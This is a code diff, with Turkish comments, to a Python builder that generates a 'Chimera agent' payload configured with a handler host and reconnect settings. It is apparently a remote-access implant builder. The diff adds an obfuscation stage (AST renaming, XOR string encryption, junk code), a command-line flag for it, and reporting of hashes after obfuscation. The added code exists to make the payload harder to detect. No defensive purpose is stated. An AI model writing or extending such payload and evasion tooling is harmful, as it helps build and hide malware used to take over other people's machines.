@@ -29,6 +29,21 @@ import ipaddress
 import argparse
 from datetime import datetime
 
+# Obfuscator kütüphanesini içe aktarmaya çalış
+try:
+    from build.chimera_obfuscator import obfuscate as _run_obfuscator, print_obfuscation_report
+    _OBFUSCATOR_AVAILABLE = True
+except ImportError:
+    try:
+        _builder_dir = os.path.dirname(os.path.abspath(__file__))
+        _project_root = os.path.dirname(_builder_dir)
+        if _project_root not in sys.path:
+            sys.path.insert(0, _project_root)
+        from build.chimera_obfuscator import obfuscate as _run_obfuscator, print_obfuscation_report
+        _OBFUSCATOR_AVAILABLE = True
+    except ImportError:
+        _OBFUSCATOR_AVAILABLE = False
+
 
 
 # ============================================================
@@ -153,12 +168,14 @@ def build_payload(
     output_path: str = None,
     agent_source_path: str = None,
     strip_comments: bool = False,
+    obfuscate: bool = False,
     quiet: bool = False
 ) -> dict:
     """Chimera agent payload'ını oluşturur.
 
     Agent kaynak kodunu okur, konfigürasyon placeholder'larını kullanıcının
-    belirlediği değerlerle değiştirir ve opsiyonel olarak dosyaya yazar.
+    belirlediği değerlerle değiştirir ve opsiyonel olarak obfuscation uygular,
+    ardından dosyaya yazar.
 
     Args:
         lhost:              Handler IP adresi veya hostname.
@@ -167,23 +184,26 @@ def build_payload(
         max_reconnect:      Maksimum yeniden bağlanma denemesi (-1 = sınırsız).
         output_path:        Çıktı dosya yolu (None ise sadece kodu döner).
         agent_source_path:  Agent kaynak dosyası yolu (None ise otomatik bulur).
-        strip_comments:     Yorum satırlarını kaldır (basit obfuscation hazırlığı).
+        strip_comments:     Yorum satırlarını kaldır.
+        obfuscate:          AST rename + XOR string encrypt + junk code uygula.
         quiet:              Ekrana çıktı basma.
 
     Returns:
         dict: Build sonucu bilgileri.
-            - success (bool)     : İşlem başarılı mı?
-            - code (str)         : Oluşturulan payload kodu.
-            - output_path (str)  : Kayıt yolu (dosyaya yazıldıysa).
-            - error (str)        : Hata mesajı (başarısızsa).
-            - stats (dict)       : İstatistikler (boyut, hash, satır sayısı).
+            - success (bool)          : İşlem başarılı mı?
+            - code (str)              : Oluşturulan payload kodu.
+            - output_path (str)       : Kayıt yolu (dosyaya yazıldıysa).
+            - error (str)             : Hata mesajı (başarısızsa).
+            - stats (dict)            : İstatistikler (boyut, hash, satır sayısı).
+            - obfuscation_stats (dict): Obfuscation istatistikleri (obfuscate=True ise).
     """
     result = {
         "success": False,
         "code": "",
         "output_path": None,
         "error": None,
-        "stats": {}
+        "stats": {},
+        "obfuscation_stats": {}
     }
 
     # --- Doğrulama ---
@@ -312,6 +332,30 @@ def build_payload(
     result["code"] = agent_code
     result["success"] = True
 
+    # --- Obfuscation (opsiyonel) ---
+    if obfuscate:
+        if not _OBFUSCATOR_AVAILABLE:
+            if not quiet:
+                print("[!] UYARI: chimera_obfuscator yüklenemedi, obfuscation atlandı.")
+        else:
+            if not quiet:
+                print("[*] Obfuscation uygulanıyor...")
+            obf_result = _run_obfuscator(agent_code)
+            if obf_result["success"]:
+                agent_code = obf_result["code"]
+                result["code"] = agent_code
+                result["obfuscation_stats"] = obf_result["stats"]
+                # Hash ve boyut istatistiklerini güncelle
+                final_enc = agent_code.encode("utf-8")
+                result["stats"]["final_size"]  = len(final_enc)
+                result["stats"]["line_count"]  = agent_code.count("\n") + 1
+                result["stats"]["md5"]         = hashlib.md5(final_enc).hexdigest()
+                result["stats"]["sha256"]      = hashlib.sha256(final_enc).hexdigest()
+                result["stats"]["obfuscated"]  = True
+            else:
+                if not quiet:
+                    print(f"[!] Obfuscation başarısız: {obf_result['error']}")
+
     # --- Dosyaya yaz ---
     if output_path:
         if not output_path.endswith(".py"):
@@ -383,6 +427,10 @@ def print_build_report(result: dict):
         strip_str = f"Evet (-%{saved_pct:.1f}, -{saved:,} bytes)"
         print(f"  ║  ├─ Yorum Temizleme : {strip_str:<35}║")
 
+    obf_flag = stats.get('obfuscated', False)
+    obf_str = "✅ Evet" if obf_flag else "Hayır"
+    print(f"  ║  ├─ Obfuscation     : {obf_str:<35}║")
+
     print(f"  ╠{border}╣")
     print(f"  ║  🔐 Hash Değerleri                                      ║")
     print(f"  ║  ├─ MD5    : {stats['md5']:<44}║")
@@ -451,7 +499,11 @@ def main():
     )
     parser.add_argument(
         "--strip-comments", action="store_true",
-        help="Yorum satırlarını ve docstring'leri kaldır (basit boyut küçültme)."
+        help="Yorum satırlarını ve docstring'leri kaldır."
+    )
+    parser.add_argument(
+        "--obfuscate", action="store_true",
+        help="AST rename + XOR string şifreleme + junk code uygula."
     )
     parser.add_argument(
         "-q", "--quiet", action="store_true",
@@ -468,8 +520,13 @@ def main():
         output_path=args.output,
         agent_source_path=args.agent_source,
         strip_comments=args.strip_comments,
+        obfuscate=args.obfuscate,
         quiet=args.quiet,
     )
+
+    # Obfuscation raporu (ayrı)
+    if args.obfuscate and result.get("obfuscation_stats") and not args.quiet and _OBFUSCATOR_AVAILABLE:
+        print_obfuscation_report({"success": True, "stats": result["obfuscation_stats"]})
 
     if args.quiet:
         if result["success"]:
